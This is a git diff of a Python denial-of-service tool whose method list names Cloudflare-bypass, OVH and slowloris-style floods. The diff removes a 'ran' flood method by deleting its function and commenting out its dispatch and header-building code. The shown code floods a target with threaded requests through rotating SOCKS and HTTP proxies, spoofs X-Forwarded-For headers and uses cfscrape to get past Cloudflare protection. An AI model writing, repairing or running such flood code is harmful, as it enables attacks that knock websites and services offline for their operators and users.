@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import secrets
-l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB","RAN"]
+l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
 to = ["DNS", "PING", "CHECK", "DSTAT", "INFO"]
 ot = ["STOP", "TOOLS", "HELP"]
 methods = l7
@@ -87,9 +87,9 @@ def start_attack(method, threads, event, socks_type):
         elif method == "hit":
             for _ in range(threads):
                 threading.Thread(target=hit, args=(event, timer), daemon=True).start()
-        elif method == "ran":
-            for _ in range(threads):
-                threading.Thread(target=ran, args=(event, timer), daemon=True).start()
+#        elif method == "ran":
+#            for _ in range(threads):
+#                threading.Thread(target=ran, args=(event, timer), daemon=True).start()
 
 
     except:
@@ -194,16 +194,16 @@ def Headers(method):
         data = str(random._urandom(64))
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
         header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
-    elif method == "ran":
-        connection = "Connection: Keep-Alive\r\n"
-        more = "Cache-Control: max-age=0\r\n"
-        more2 = "Via: 1.0 PROXY\r\n"
-        proxyd = str(proxy)
-        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
-        accept = "Accept: */*\r\n"
-        referer = "Referer: " + referers + target + path + "\r\n"
-        useragent = "User-Agent: " + UserAgent + "\r\n"
-        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
+#    elif method == "ran":
+#        connection = "Connection: Keep-Alive\r\n"
+#        more = "Cache-Control: max-age=0\r\n"
+#        more2 = "Via: 1.0 PROXY\r\n"
+#        proxyd = str(proxy)
+#        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
+#        accept = "Accept: */*\r\n"
+#        referer = "Referer: " + referers + target + path + "\r\n"
+#        useragent = "User-Agent: " + UserAgent + "\r\n"
+#        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
     return header
 
 
@@ -791,33 +791,7 @@ def slow(conn, socks_type):
             s.close()
             proxy = Choice(proxies).strip().split(":")
 
-def ran(event, socks_type):
-    header = Headers("get")
-    proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?" + str(random._urandom(1995)) + "HTTP/1.1\r\nHost: " + target + "\r\n"
-    request = get_host + header
-    event.wait()
-    while time.time() < timer:
-        try:
-            s = socks.socksocket()
 
-            if socks_type == 5:
-                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            if socks_type == 1:
-                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.connect((str(target), int(port)))
-            if protocol == "https":
-                ctx = ssl.SSLContext()
-                s = ctx.wrap_socket(s, server_hostname=target)
-            cfscrape.create_scraper(sess=s)
-            try:
-                for _ in range(multiple):
-                    s.sendall(str.encode(request))
-            except:
-                s.close()
-        except:
-            s.close()
 
 def checking(lines, socks_type, ms):
     global nums, proxies
